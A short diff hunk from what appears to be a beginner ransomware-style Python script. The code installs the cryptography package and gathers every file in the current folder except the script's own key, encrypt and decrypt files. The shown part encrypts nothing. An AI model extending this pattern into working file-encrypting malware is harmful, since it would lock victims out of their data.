@@ -4,7 +4,7 @@ os.system("pip install cryptography")
 
 files = []
 for file in os.listdir():
-    if file == "class1.py" or file == "thekey.txt" or file == "decrypt.py":
+    if file == "encrypt.py" or file == "thekey.txt" or file == "decrypt.py":
         continue
     if os.path.isfile(file):
         files.append(file)
